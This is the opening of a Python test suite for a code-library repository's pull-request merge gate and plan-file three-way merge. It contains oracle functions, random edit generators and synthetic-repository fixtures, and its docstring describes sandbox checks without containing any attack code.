#!/usr/bin/env python3
"""Checks for the maintainer gate .claude/skills/merge-pr/merge_pr.py and the packages.json merge of
00-Guidelines/13-Plan/worktree.py --sync (merge3, order, merge_plan and the conflict loop of sync).

The real repository is only read. Synthetic repositories live in per-test temporary directories: under /tmp, except
those whose worktree is sandboxed (Sandbox, Gates), which live under /var/tmp beside the gates' scratch directories
(test_sandbox_worktree_under_tmp checks that a worktree under /tmp works too). A
synthetic main checkout holds copies of plan.py, worktree.py, merge_pr.py and _00_memory_cap.py at their repository
paths (merge_pr.py computes ROOT from its own path), a stub 03-consistency.py printing {"errors": []}, and either the
real plan (packages.json, batches.json, 01-prompts.md) or a mini plan on which the real `plan.py check` and `doctor`
pass (two inventories, a stub 98-Team Notebook/05-dependencies.py and 01-run.py). Gate stubs (02-integration.py,
04-mutation.py, 97-Online Testing/03-workspace.py, two _tester.py files) print their mode, CXX, arguments and cgroup memory.max and
fail or touch files as a committed gate-control.json says. A fake `gh` (a shell wrapper around a Python script) sits
with a `git` symlink alone on PATH for `files` and answers `pr view` from a fixture (only the --json fields asked for); the role and the rewrite of
https://github.com/ to a local bare repository holding refs/pull/<N>/head come from GIT_CONFIG_COUNT, with global and
system config at /dev/null and GIT_ALLOW_PROTOCOL=file, so no test reaches GitHub. Sandbox tests SKIP with the reason
when bwrap or memory-capped systemd user scopes are unavailable; the real home directory is never written.
quick: every exact and strict merge3/order case, 20 general, 10 disjoint and 10 same-field random merge3 rounds, 50 random order
rounds, exact classification, mb_of, one sync scenario and one sandbox probe. full: everything, with 300/150/150
merge3 rounds, 1000 order rounds, 4 random classification repositories, 2 random sync rounds and one traced run of the
real 03-consistency.py. stress: full with --rounds R (default 20): 30R/15R/15R merge3 rounds, 100R order rounds, R//2
classification repositories, R//4 sync rounds (each at least the full count). Modes/seeds also come from
CP_TEST_MODE/CP_TEST_SEED.
Oracles (written here, independent of the code under test): a schema-driven brute-force three-way merge of plan-like
documents on canonical JSON (top keys, models per key, packages per string id, entry fields, the `extra` dict per key,
anything else a leaf); edit-intent properties (disjoint edits on the two sides: no clash and the composition of both
edit lists; one field edited differently on both: exactly that path); for order, the permutation, primary-order and
predecessor characterisation (an id only the other side has sits right after its predecessor in that side's list, or
first); a segment scanner for library paths, file modes, tags and the 01-prompts.md text outside the plan block; an
audit hook (sitecustomize) logging every file the real 03-consistency.py and plan.py rank/render compile, execute or
open for writing; expected packages.json entries rebuilt from the edits made on each side, rank as a fixpoint and
01-prompts.md as plan.rendered_file of the merged plan; `git merge-tree` to prove a sync scenario really conflicts;
expected gate lists, caps, CXX values and state files rebuilt from the fixture; host git status and file bytes and
modes before and after a sandboxed run. Failures print seed, mode, round, fixture and the (greedily shrunk, for merge3)
reproducer.

Feature map:
merge3 (one-sided change, equal changes, MISSING add/delete, dict per key, deletion vs unchanged deletes, deletion vs
modification clashes, id lists per entry, other lists and scalars clash with the path, no input mutated; values compare
as canonical JSON so 1, 1.0 and true differ and key order does not; id lists need a string id on every element; a
repeated id on any side clashes as `<where> (repeated id)` unless ours == theirs or theirs == base) ->
test_merge3_exact, test_merge3_strict, test_merge3_random (with duplicated entries), test_merge3_disjoint_random,
test_merge3_same_field_random;
order (ours unless only theirs reordered, new ids after their predecessor or first, deleted ids kept for merge3) ->
test_order_exact, test_order_random;
merge_plan and the sync loop (packages.json merged then plan.py rank; plan block re-rendered; clash aborts with the
path and leaves the branch; other file, outside-block, one-sided deletion and non-JSON side abort; a failing rank or
render aborts the rebase and re-raises; two conflicting commits; random disjoint and clashing edits) ->
test_sync_packages_conflict, test_sync_same_field_clash, test_sync_other_file_conflict, test_sync_prompts_only,
test_sync_prompts_outside_block, test_sync_plan_deleted, test_sync_plan_not_json, test_sync_resolver_fails,
test_sync_two_commits, test_sync_random;
LIBRARY, HIDDEN, HOST_RUN, AGENT and changes (library and outside paths, 98-Team Notebook/02-selection.json and
Articles/ in and the rest of 98 and 95-Resources out, symlinks and gitlinks outside, type changes, the old mode of a
changed path, 01-prompts.md outside the plan block, dot files, CLAUDE*.md, AGENTS.md, __pycache__, *.pyc and *.so
components outside even in library folders; outside tags `runs on the host at checkout` before `loaded by Claude Code`) -> test_classify_exact,
test_classify_random, test_classify_old_mode, test_files_claim; HOST_RUN names every repository .py file that
03-consistency.py (read-only on the real repository, which it never writes) and plan.py rank and render execute,
including a pull request's module (source or sourceless bytecode) that shadows a standard module beside them -> test_host_run_coverage,
test_host_run_shadow;
files (maintainer only, linked worktree refused, refused while the record's worktree exists, gh failure, STOP for
draft, closed, merged, base not master; moved head; claim branch -> package, model, branch; non-claim and wrong-batch
branch -> pr-N; CORE_FULL -> reviewer model fable, the CORE FULL line, `reviewer model <m or default>`; OUTSIDE,
library and final lines; state file; DECISIONS: added non-blank lines naming the user's decision or a dated one, and
lines other than headings added under a ledger's `## Recorded decisions`, with path and line, 01-prompts.md skipped) ->
test_files_*, test_checkout_land;
checkout, land, drop (worktree added on the branch and synced, `created` recorded, exit 0 with the next step; exit 1
with worktree.py's output after its stderr, another branch checked out, or a worktree not based on master; existing
worktree and no record refused; land refuses without passed, on another head, after master moved (without asking gh),
then asks gh once for state and head and refuses a closed, merged or moved pull request or a gh failure; lands: master
at the head, worktree, branch, fetched ref and state removed, push and close lines, nothing pushed; drop removes
worktree, branch, ref and state, the branch only when checkout created it (a pre-existing branch survives a failed
checkout and drop; a created branch deleted by hand is skipped, and files rerun keeps `created`), checks every step and
on a failure exits nonzero listing them and keeps the record) -> test_checkout_land, test_checkout_exit_status,
test_checkout_failures, test_checkout_refusals, test_drop, test_drop_keeps_branch, test_drop_branch_gone, test_drop_failure;
sandbox/sandboxed/run (no network, / read-only, home hidden but PATH dirs, git common dir read-only, other worktrees'
git directories hidden and the own one readable, /mnt, /media and /srv empty, /run/user absent, systemd-run fails;
the worktree through an overlay: writes, appends, edits, deletions, chmods, 0111 directories, a planted .pyc of a
host-run module, a nested repository, a rewritten .git file and the fsmonitor gitdir attack stay inside, host git
status, bytes and modes unchanged, the attack command never runs; private empty /tmp; the /var/tmp/merge-pr-* scratch
directory removed after, 0111 directories and symlinks to directories included; PID namespace, environment whitelist
without XDG_RUNTIME_DIR and DBUS_SESSION_BUS_ADDRESS, cgroup memory.max and pids.max, cap kill, exit status, TIMEOUT
-> 124, missing bwrap, a worktree under /tmp; `run N --mb MB -- CMD` with MB clamped to MAX_MB, the command only after
`--`; run, gates and land refuse before checkout; run leaves the worktree as it was) -> test_sandbox_*, test_run_cli, test_run_cli_mb_after_n, test_run_overlay;
gates (all PASS with tested/master, gate order, caps and CXX per gate, CXX not leaked, failing gate, failed pre-flight
skips full runs, one CXX failing, gates and testers writing into the tree still pass and leave it unchanged, a deleted
tester of the package fails, dirty or unbased worktree refused; mutation records: the headers the pull request adds or
modifies (<01-07 folder>/<NN>-*.hpp, not 98-/99- aggregates, nested, deleted or master-only ones), sorted, split by the
oracle o_mutation_gates, per header: loose (`check --existing`) when every subject of the branch commits changing it is a
/prune or /restyle one (any package id, the subject line only; prune-only, restyle-only, both, multi-line message, a
maintainer fix of another file) or another package of master's plan lists the header's evidence document and the pull
request's package does not (another package beside the package's own header, no package, also for a shared document,
an unknown package), strict (`check`) otherwise (a maintainer fix or another subject on the header, two headers with
different histories in one pull request, near-miss subjects, empty subjects from empty messages, also under a /restyle
commit, the package's own document, one it shares with another package, near-miss documents); the strict gate first,
each only when its group is non-empty, at the default cap whatever the script declares, after the suites and before
integration; the `none` line when no header changed; a failing check fails the
gates) -> test_gates_*, test_gates_mutation_records,
test_gates_mutation_failing, test_gates_mutation_master_only, test_gates_mutation_subjects, test_gates_mutation_owners;
suites (found: master's plan at ROOT, changed inventory
targets, changed testers; deleted: master's testers of the package's targets and changed testers missing from the worktree, renames ignored),
HEADER, MUTATED (equal to 04-mutation.py HEADER), MECHANICAL, CORE_FULL, mb_of (MAX_MB clamp, non-UTF-8 files) -> test_gates_*,
test_suites, test_mb_of.
"""
import argparse
import copy
import difflib
import errno
import glob
import importlib.util
import json
import os
import py_compile
from pathlib import Path
import random
import re
import shlex
import shutil
import subprocess
import sys
import tempfile
import time
import unittest
from unittest.mock import patch
sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
import _00_memory_cap

_00_memory_cap.ensure()

ROOT = Path(__file__).resolve().parents[2]
PLAN_REL = '00-Guidelines/13-Plan'
PJ = PLAN_REL + '/packages.json'
MERGE_REL = '.claude/skills/merge-pr/merge_pr.py'
CAP_REL = '96-Local Testing/_00_memory_cap.py'
MODE, SEED, ROUNDS = 'full', 42, 20
REPO = 'Ausp3x/CompProg-Library'
WHITELIST = ('PATH', 'HOME', 'USER', 'LANG', 'LC_ALL', 'TERM', 'XDG_RUNTIME_DIR', 'DBUS_SESSION_BUS_ADDRESS')
UNSET = ('XDG_RUNTIME_DIR', 'DBUS_SESSION_BUS_ADDRESS')  # passed to systemd-run, removed by bwrap
QUICK = {'test_merge3_exact', 'test_merge3_strict', 'test_order_exact', 'test_merge3_random', 'test_merge3_disjoint_random', 'test_merge3_same_field_random',
         'test_order_random', 'test_classify_exact', 'test_mb_of', 'test_sync_packages_conflict', 'test_sandbox_probe'}
BEGIN, END = '<!-- plan:begin -->', '<!-- plan:end -->'
# sitecustomize for test_host_run_coverage: logs every file compiled, executed or run as a script, and every file opened for writing
AUDIT = r'''import os, sys
_log, _busy, _w = os.environ['MT_AUDIT_LOG'], [False], os.O_WRONLY | os.O_RDWR | os.O_CREAT | os.O_TRUNC | os.O_APPEND
def _hook(event, args):
    if _busy[0]:
        return
    if event == 'exec' and hasattr(args[0], 'co_filename'):
        kind, f = 'ran', args[0].co_filename
    elif event == 'compile' and isinstance(args[1], str):
        kind, f = 'ran', args[1]
    elif event == 'cpython.run_file':
        kind, f = 'ran', args[0]
    elif event == 'open' and isinstance(args[0], (str, bytes, os.PathLike)) and (
            isinstance(args[1], str) and set(args[1]) & set('wax+') or isinstance(args[2], int) and args[2] & _w):
        kind, f = 'write', os.fsdecode(args[0])
    else:
        return
    _busy[0] = True
    try:
        fd = os.open(_log, os.O_WRONLY | os.O_CREAT | os.O_APPEND, 0o600)
        os.write(fd, f'{kind}\t{os.path.abspath(f)}\n'.encode('utf-8', 'surrogateescape'))
        os.close(fd)
    finally:
        _busy[0] = False
sys.addaudithook(_hook)
'''


def load(path, name):
    spec = importlib.util.spec_from_file_location(name, path)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


PLAN = load(ROOT / PLAN_REL / 'plan.py', 'merge_tester_plan')
WT = load(ROOT / PLAN_REL / 'worktree.py', 'merge_tester_worktree')
MP = load(ROOT / MERGE_REL, 'merge_tester_merge_pr')
M = WT.MISSING
REAL_RUN = subprocess.run
ISOLATED = {k: v for k, v in os.environ.items() if not k.startswith(('GIT_', 'CLAUDE_CODE_AGENT', 'CLAUDE_EFFORT'))} | {
    'GIT_CONFIG_GLOBAL': os.devnull, 'GIT_CONFIG_SYSTEM': os.devnull, 'GIT_CONFIG_NOSYSTEM': '1'}


def rounds(quick, full, per_round):
    return quick if MODE == 'quick' else full if MODE == 'full' else max(full, int(ROUNDS * per_round))


def git(cwd, *args, env=None, check=True, input=None):
    r = REAL_RUN(['git', *args], cwd=cwd, capture_output=True, text=True, env=env or ISOLATED, input=input)
    if check and r.returncode:
        raise RuntimeError(f'git {" ".join(args)} failed in {cwd}: {r.stderr}')
    return r.stdout.strip() if check else r


# Independent oracles

def o_canon(x):
    """Canonical JSON text (1, 1.0 and true differ; key order does not), MISSING unchanged."""
    return x if x is M else json.dumps(x, sort_keys=True)


def o_leaf(b, o, t):
    """(value, clash) of the leaf rule on canonical JSON: equal sides or one unchanged side take the other."""
    b, o, t, raw = o_canon(b), o_canon(o), o_canon(t), {o_canon(b): b, o_canon(t): t, o_canon(o): o}
    if o == t or t == b:
        return raw[o], False
    if o == b:
        return raw[t], False
    return raw[o], True


CHILD = {'doc': {'models': 'dict', 'packages': 'ids'}, 'entry': {'extra': 'dict'}, 'dict': {}}


def o_merge(kind, b, o, t, where, out):
    """Brute-force merge of a plan-like node; id lists come back as {id: entry}."""
    v, clash = o_leaf(b, o, t)
    if not clash:
        return v
    ok = (lambda x: isinstance(x, list) and all(isinstance(e, dict) and type(e.get('id')) is str for e in x)) if kind == 'ids' else \
        (lambda x: isinstance(x, dict))
    if kind == 'leaf' or not all(ok(x) for x in (b, o, t)):
        out.append(where)
        return o
    if kind == 'ids':
        if any(len({e['id'] for e in x}) != len(x) for x in (b, o, t)):
            out.append(f'{where} (repeated id)')
            return o
        maps = [{e['id']: e for e in x} for x in (b, o, t)]
        res = {}
        for i in set(maps[0]) | set(maps[1]) | set(maps[2]):
            r = o_merge('entry', *(m.get(i, M) for m in maps), f'{where}[{i}]', out)
            if r is not M:
                res[i] = r
        return res
    res = {}
    for k in set(b) | set(o) | set(t):
        r = o_merge(CHILD[kind].get(k, 'leaf'), b.get(k, M), o.get(k, M), t.get(k, M), f'{where}.{k}', out)
        if r is not M:
            res[k] = r
    return res


def norm(doc):
    """A plan-like document with its packages list as {id: entry} (order is checked separately)."""
    if not isinstance(doc, dict):
        return doc
    d = dict(doc)
    if isinstance(d.get('packages'), list):
        d['packages'] = {e['id']: e for e in d['packages']}
    return d


def o_moved(base, x):
    return [i for i in x if i in base] != [i for i in base if i in x]


def o_primary(base, ours, theirs):
    return (theirs, ours) if o_moved(base, theirs) and not o_moved(base, ours) else (ours, theirs)


def o_order_check(base, ours, theirs, res):
    """None when res is the merged order: a permutation of both sides' ids, the primary side's order kept, and each id
    only the other side has placed right after its predecessor in that side's list (first when it has none)."""
    primary, other = o_primary(base, ours, theirs)
    if sorted(res) != sorted(set(ours) | set(theirs)) or len(res) != len(set(res)):
        return f'not a permutation of the union: {res}'
    if [i for i in res if i in primary] != list(primary):
        return f'primary order {primary} not kept: {res}'
    for k, i in enumerate(other):
        if i not in primary:
            at = res.index(i)
            if (k == 0 and at != 0) or (k > 0 and (at == 0 or res[at - 1] != other[k - 1])):
                return f'{i} not right after {other[k - 1] if k else "the front"}: {res}'
    return None


def o_numbered(seg):
    return len(seg) >= 4 and seg[0] == '0' and seg[1] in '12345678' and seg[2] == '-'


def o_library(path):
    p = path.split('/')
    if len(p) >= 2 and o_numbered(p[0]):
        return True
    if p[0] == '96-Local Testing':
        return p[1:] == ['00-index.md'] or (len(p) >= 3 and o_numbered(p[1]))
    if p[0] == '97-Online Testing':
        return len(p) >= 3 and p[1] in ('src', 'Docs')
    if p[0] == '98-Team Notebook':
        return p[1:] == ['02-selection.json'] or (len(p) >= 3 and p[1] == 'Articles')
    if p[0] == '00-Guidelines':
        return (len(p) == 3 and p[1] in ('Ledgers', '23-Sweep Ledgers')) or p[1:] in (['13-Plan', 'packages.json'], ['13-Plan', 'finish-log.tsv'])
    return False


def o_hidden(c):
    """A path component outside library code anywhere: dot files and folders, CLAUDE*.md, AGENTS.md, __pycache__, and
    bytecode or extension modules (*.pyc, *.so), which Python runs in place of the reviewed source."""
    return (c.startswith('.') or c in ('AGENTS.md', '__pycache__') or c.endswith(('.pyc', '.so'))
            or (len(c) >= 9 and c.startswith('CLAUDE') and c.endswith('.md')))


O_HOST_RUN = {'96-Local Testing/03-consistency.py', '96-Local Testing/02-integration.py', '96-Local Testing/_00_memory_cap.py',
              '96-Local Testing/_00_cpp_test_runner.py', '98-Team Notebook/01-notebook.py', '98-Team Notebook/05-dependencies.py',
              '00-Guidelines/13-Plan/plan.py', '.claude/skills/setup-check/setup_check.py'}


def o_host_run(path):
    """Runs on the host at checkout: the named files, and any module or package directly in the import-path folders of
    the scripts run directly (96-Local Testing for 03-consistency.py, 00-Guidelines/13-Plan for plan.py)."""
    for folder in ('96-Local Testing/', '00-Guidelines/13-Plan/'):
        if path.startswith(folder):
            rest = path[len(folder):].split('/')
            return (len(rest) == 1 and rest[0].endswith(('.py', '.pyc', '.so'))) or (len(rest) > 1 and rest[0].isidentifier() and rest[-1] != '')
    return path in O_HOST_RUN


def o_agent(path):
    """Loaded by Claude Code: anything under a .claude/ folder at any depth, a CLAUDE*.md or AGENTS.md file in any
    folder, or the root .mcp.json."""
    parts = path.split('/')
    last = parts[-1]
    return ('.claude' in parts[:-1]) or last == 'AGENTS.md' or path == '.mcp.json' or (
        len(last) >= 9 and last.startswith('CLAUDE') and last.endswith('.md'))


def o_tag(path):
    return 'outside library code' + ('; runs on the host at checkout' if o_host_run(path) else '; loaded by Claude Code' if o_agent(path) else '')


def o_header(p):
    """An inventory target: <0N-folder>/<NN-name>.hpp or <0N-folder>/_<NN>_<name>.py."""
    parts = p.split('/')
    if len(parts) != 2 or not o_numbered(parts[0]):
        return False
    n = parts[1]
    return (n[:2].isdigit() and n[2:3] == '-' and n.endswith('.hpp') and len(n) > 7) or (
        n[:1] == '_' and n[1:3].isdigit() and n[3:4] == '_' and n.endswith('.py') and len(n) > 7)


def o_mutated(p):
    """A header that carries a mutation record: <01-07 folder>/<NN>-<name>.hpp, not a 98- or 99- aggregate."""
    parts = p.split('/')
    return (len(parts) == 2 and o_numbered(parts[0]) and parts[0][1] in '1234567' and parts[1][:2].isdigit() and parts[1][2:3] == '-'
            and parts[1][:2] not in ('98', '99') and parts[1].endswith('.hpp') and len(parts[1]) > 7)


def o_mechanical(subject):
    """The subject of a /prune or /restyle commit: P<three ASCII digits>: prune duplicates|restyle, nothing around it."""
    head, sep, rest = subject.partition(': ')
    return bool(sep) and len(head) == 4 and head[0] == 'P' and all(c in '0123456789' for c in head[1:]) and rest in ('prune duplicates', 'restyle')


def o_mutation_gates(plan_packages, package, subjects, headers):
    """The mutation records gates as (name, 04-mutation.py arguments) in run order. subjects maps each header to the
    subjects of the branch commits that change it. A header is loose (existing records only) when each of those is a
    /prune or /restyle subject (no commit counts as one empty subject), or when some package of master's plan lists its
    evidence document <folder>/Docs/<stem>.md and the pull request's package is not among them; the rest are strict.
    A group with no header has no gate."""
    def mechanical(h):
        return not [x for x in (subjects.get(h) or ['']) if not o_mechanical(x)]

    def foreign(h):
        folder, name = h.split('/')
        doc = folder + '/Docs/' + name[:-len('.hpp')] + '.md'
        owners = {e['id'] for e in plan_packages['packages'] if doc in e['evidence']}
        return len(owners) > 0 and package not in owners
    loose = [h for h in headers if mechanical(h) or foreign(h)]
    strict = [h for h in headers if h not in loose]
    return [(name, ['check', *flag, *group]) for name, flag, group in
            (('mutation records', [], strict), ('mutation records (existing only)', ['--existing'], loose)) if group]


def o_core_full(p):
    parts = p.split('/')
    return len(parts) == 2 and parts[0] == '01-Core' and parts[1][:2].isdigit() and parts[1][2:3] == '-' and parts[1].endswith('.hpp') \
        and 'mini' not in parts[1]


def o_tests(root, target):
    """Testers of a target: 96-Local Testing/<folder>/[_]<NN>[-_]*_tester.py with the target's two digits."""
    folder, name = target.split('/')
    d = Path(root) / '96-Local Testing' / folder
    nn = name.lstrip('_')[:2]
    return {f'96-Local Testing/{folder}/{f.name}' for f in (d.iterdir() if d.is_dir() else []) if f.is_file()
            and f.name.lstrip('_')[:2] == nn and f.name.lstrip('_')[2:3] in ('-', '_') and f.name.endswith('_tester.py')}


def o_outside(text):
    i, j = text.find(BEGIN), text.find(END)
    return text[:i] + '\0' + text[j + len(END):] if i >= 0 and j >= 0 else text


def o_kind(mode):
    return {'120000': 'link', '160000': 'gitlink', '000000': None}.get(mode, 'file')


def o_decision(text):
    """A word scan for DECISION: `user` within 40 characters before or after a word starting `decid` or `decision`,
    `decided` then whitespace and a dddd-dd-dd date, or `(user`, an optional comma, whitespace and four digits and '-'."""
    words, i, low = [], 0, text.lower()
    while i < len(low):
        if low[i].isalnum() or low[i] == '_':
            j = i
            while j < len(low) and (low[j].isalnum() or low[j] == '_'):
                j += 1
            words.append((i, j, low[i:j]))
            i = j
        else:
            i += 1
    users = [w for w in words if w[2] == 'user']
    decs = [w for w in words if w[2].startswith(('decid', 'decision'))]
    if any(0 <= d[0] - u[1] <= 40 or 0 <= u[0] - d[1] <= 40 for u in users for d in decs):
        return True
    for k, (a, b, w) in enumerate(words):
        rest = text[b:]
        if w == 'decided' and rest[:1].isspace() and k + 3 < len(words):
            y, m, d = words[k + 1:k + 4]
            if text[b:y[0]].isspace() and (len(y[2]), len(m[2]), len(d[2])) == (4, 2, 2) and all(x[2].isdigit() for x in (y, m, d)) \
                    and text[y[1]] == '-' and m[0] == y[1] + 1 and text[m[1]] == '-' and d[0] == m[1] + 1:
                return True
        if w == 'user' and a > 0 and text[a - 1] == '(':
            tail = rest[1:] if rest[:1] == ',' else rest
            body = tail.lstrip()
            if body != tail and len(body) > 4 and body[:4].isdigit() and body[4] == '-':
                return True
    return False


def o_decisions(paths, base, head):
    """Expected DECISIONS rows (path, line, text) from {path: (mode, content)} trees, paths in git's order."""
    out = []
    for path in paths:
        if path == '01-prompts.md' or path not in head or not isinstance(head[path][1], str):
            continue
        old = base[path][1].split('\n') if path in base and isinstance(base[path][1], str) else []
        new = head[path][1].split('\n')
        if new and new[-1] == '':
            new.pop()
        if old and old[-1] == '':
            old.pop()
        for tag, _, _, j1, j2 in difflib.SequenceMatcher(None, old, new, autojunk=False).get_opcodes():
            for j in range(j1, j2) if tag in ('insert', 'replace') else ():
                heading = next((h for h in reversed(new[:j]) if h.startswith('## ')), '')
                ledger = path.startswith('00-Guidelines/23-Sweep Ledgers/') and heading.strip() == '## Recorded decisions' and new[j][:1] != '#'
                if new[j].strip() and (o_decision(new[j]) or ledger):
                    out.append((path, j + 1, new[j]))
    return out


def o_rows(base, head, prompts=('', '')):
    """Expected (status, path, why) rows from two {path: (mode, content)} trees; prompts = 01-prompts.md texts."""
    rows = []
    for path in sorted(set(base) | set(head), key=lambda p: p.encode()):
        (om, oc), (nm, nc) = base.get(path, ('000000', None)), head.get(path, ('000000', None))
        if (om, oc) == (nm, nc):
            continue
        status = 'A' if om == '000000' else 'D' if nm == '000000' else 'T' if o_kind(om) != o_kind(nm) else 'M'
        why = ('symlink' if '120000' in (om, nm) else 'submodule' if '160000' in (om, nm) else
               '' if not any(o_hidden(c) for c in path.split('/')) and (o_library(path) or path == '01-prompts.md' and o_outside(prompts[0])
                                                                       == o_outside(prompts[1])) else o_tag(path))
        rows.append((status, path, why))
    return rows


# Random plan-like documents and edits

FIELDS = ('label', 'batches', 'status', 'model', 'evidence', 'note', 'extra')


def r_entry(rng, pid):
    return {'id': pid, 'label': 'L' + pid, 'batches': ['B' + pid[1:]], 'status': rng.choice(['planned', 'in-progress', 'verified']),
            'model': rng.choice(['fable', 'opus']), 'evidence': rng.choice([[], ['e1']]), 'note': rng.choice(['', 'n0']),
            'extra': {'a': 0, 'b': 0}}


def r_doc(rng, n):
    return {'date': '2026-10-24', 'statuses': ['planned', 'in-progress', 'verified'], 'models': {'fable': 'f', 'opus': 'o'},
            'packages': [r_entry(rng, f'P{i:03d}') for i in rng.sample(range(1, 90), n)]}


def r_value(field, tag):
    return [tag] if field in ('batches', 'evidence') else {'a': tag} if field == 'extra' else tag


def r_ops(rng, doc, side, ids, k, tops=(), new=(), moves=True, drops=True, dups=False):
    """k random edits of the given entries (and top-level keys), tagged with side."""
    ops = []
    for n in range(k):
        tag = f'{side}{n}{rng.randint(0, 3)}'
        kind = rng.choice(['set', 'set', 'sub', 'delsub', 'del', 'add'] + ['drop'] * drops + ['move'] * moves + ['dup'] * dups
                          + ['new'] * bool(new) + ['top'] * bool(tops))
        if kind in ('new', 'top') or not ids:
            if new and (kind == 'new' or not tops):
                ops.append(('new', rng.choice(new), rng.randint(0, len(doc['packages'])), tag))
            elif tops:
                key = rng.choice(tops)
                ops.append(('date', tag) if key == 'date' else ('model', rng.choice(['fable', 'opus', 'x' + side]), rng.choice([tag, None])))
            continue
        pid = rng.choice(ids)
        if kind == 'set':
            f = rng.choice(FIELDS)
            ops.append(('set', pid, f, r_value(f, tag)))
        elif kind == 'sub':
            ops.append(('sub', pid, rng.choice('abc'), tag))
        elif kind == 'delsub':
            ops.append(('sub', pid, rng.choice('ab'), None))
        elif kind == 'del':
            ops.append(('set', pid, rng.choice(FIELDS), None))
        elif kind == 'add':
            ops.append(('set', pid, 'x' + side, tag))
        elif kind == 'dup':
            ops.append(('dup', pid))
        elif kind == 'drop':
            ops.append(('drop', pid))
        else:
            ops.append(('move', pid, rng.randint(0, len(doc['packages']))))
    return ops


def apply_ops(doc, ops):
    d = copy.deepcopy(doc)
    pl = d['packages']
    find = lambda pid: next((e for e in pl if e['id'] == pid), None)
    for op in ops:
        if op[0] == 'date':
            d['date'] = op[1]
        elif op[0] == 'model':
            if op[2] is None:
                d['models'].pop(op[1], None)
            else:
                d['models'][op[1]] = op[2]
        elif op[0] == 'new':
            if not find(op[1]):
                e = {'id': op[1], 'label': 'new', 'batches': [], 'status': 'planned', 'model': 'opus', 'evidence': [], 'note': op[3],
                     'extra': {'a': 0, 'b': 0}}
                pl.insert(min(op[2], len(pl)), e)
        elif op[0] == 'dup':
            if find(op[1]):
                pl.append(copy.deepcopy(find(op[1])))
        elif op[0] == 'drop':
            if find(op[1]):
                pl.remove(find(op[1]))
        elif op[0] == 'move':
            e = find(op[1])
            if e:
                pl.remove(e)
                pl.insert(min(op[2], len(pl)), e)
        else:
            e = find(op[1])
            if e is None:
                continue
            if op[0] == 'set':
                if op[3] is None:
                    e.pop(op[2], None)
                else:
                    e[op[2]] = copy.deepcopy(op[3])
            elif isinstance(e.get('extra'), dict):
                if op[3] is None:
                    e['extra'].pop(op[2], None)
                else:
                    e['extra'][op[2]] = op[3]
    return d


def shrink(check, a, b):
    """Greedily drop edits from either side while check still reports an error."""
    changed = True
    while changed:
        changed = False
        for side in (0, 1):
            ops = (a, b)[side]
            for i in range(len(ops)):
                trial = ops[:i] + ops[i + 1:]
                if check(*((trial, b) if side == 0 else (a, trial))):
                    a, b = (trial, b) if side == 0 else (a, trial)
                    changed = True
                    break
    return a, b


# Synthetic repositories

GITIGNORE = '**/__pycache__/\n.claude/merge-pr/\n.claude/worktrees/\nignored-*\n'
STUB_CONSISTENCY = ('import json, os\nf = "validator-errors.txt"\n'
                    'print(json.dumps({"errors": open(f).read().split() if os.path.exists(f) else []}))\n')
STUB_GATE = r'''import json, os, subprocess, sys
NAME = '@NAME@'  # @MB@
MODE = sys.argv[sys.argv.index('--mode') + 1] if '--mode' in sys.argv else '-'
ctl = json.load(open('gate-control.json')) if os.path.exists('gate-control.json') else {}
cg = open('/proc/self/cgroup').read().split('::', 1)[1].strip()
mem = open('/sys/fs/cgroup' + cg + '/memory.max').read().strip()
cxx = str(os.environ.get('CXX'))
print('GATE ' + json.dumps({'name': NAME, 'mode': MODE, 'cxx': cxx, 'mem': mem, 'args': sys.argv[1:]}), flush=True)
for path in ctl.get('mkrepo', {}).get(NAME, []):
    subprocess.run(['git', 'init', '-q', path], check=True)
for path in ctl.get('touch', {}).get(NAME, []):
    os.makedirs(os.path.dirname(path) or '.', exist_ok=True)
    with open(path, 'a') as f:
        f.write('touched\n')
sys.exit(3 if {NAME, NAME + ':' + MODE, NAME + ':' + MODE + ':' + cxx} & set(ctl.get('fail', [])) else 0)
'''
GATE_STUBS = {'96-Local Testing/02-integration.py': ('integration', '_00_memory_cap.ensure(mb=6144)'),
              '97-Online Testing/03-workspace.py': ('workspace', ''),
              '96-Local Testing/04-mutation.py': ('mutation', '_00_memory_cap.ensure(mb=8192)'),
              '96-Local Testing/01-Core/01-x_tester.py': ('x', '_00_memory_cap.ensure(force=True, mb=99999)')}
D_TESTER = '96-Local Testing/02-Data Structures/01-d_tester.py'
X_TESTER = '96-Local Testing/01-Core/01-x_tester.py'
MINI_BATCHES = {'date': '2026-10-24', 'batches': [
    {'id': 'C01', 'folder': '01-Core', 'targets': ['01-Core/01-x.hpp'], 'support_targets': [], 'size': 'M', 'focus': 'f',
     'prerequisites': [], 'tiers': ['Core']},
    {'id': 'DS01', 'folder': '02-Data Structures', 'targets': ['02-Data Structures/01-d.hpp'], 'support_targets': [], 'size': 'S',
     'focus': 'f', 'prerequisites': [], 'tiers': ['Basic']},
    *({'id': b, 'folder': 'support', 'targets': [], 'support_targets': [], 'size': 'S', 'focus': 'f', 'prerequisites': [], 'tiers': []}
      for b in ('SUP17', 'SUP18', 'SUP19'))]}
MINI_PACKAGES = {'date': '2026-10-24', 'statuses': ['planned', 'in-progress', 'verified'],
                 'models': {'fable': 'claude-fable-5-1', 'opus': 'claude-opus-5-5'},
                 'packages': [{'id': i, 'label': 'L' + i, 'batches': bs, 'phase': ph, 'size': 'M', 'model': m, 'status': s, 'evidence': [],
                               'note': note}
                              for i, bs, ph, m, s, note in (('P250', ['SUP17', 'SUP18', 'SUP19'], 'Foundations re-audit', 'opus', 'in-progress', 'n'),
                                                            ('P001', ['C01'], 'Core full types', 'fable', 'planned', ''),
                                                            ('P030', ['DS01'], 'Contest core', 'opus', 'planned', ''))]}
MINI_FILES = {
    '01-Core/00-index.md': '# Core\n\n| Header | Operations | Status |\n|---|---|---|\n| `01-x.hpp` | ops | planned |\n',
    '02-Data Structures/00-index.md': '# DS\n\n## Basic\n\n| Header | Operations | Status |\n|---|---|---|\n| `01-d.hpp` | ops | planned |\n',
    '98-Team Notebook/05-dependencies.py': 'def scan(root):\n    return {}\n\n\ndef headers(root, found=None):\n    return {}\n',
    '96-Local Testing/01-run.py': "QUICK = {'01-x_tester.py'}\n",
    '01-prompts.md': f'Intro line\n\n{BEGIN}\n{END}\n\nTail line\n',
    'gate-control.json': '{}\n'}


def write(root, rel, text):
    p = root / rel
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(text)
    return p


def gate_stub(name, mb):
    return STUB_GATE.replace('@NAME@', name).replace('@MB@', mb)


def commit(root, msg):
    git(root, 'add', '-A')
    git(root, 'commit', '-q', '-m', msg)
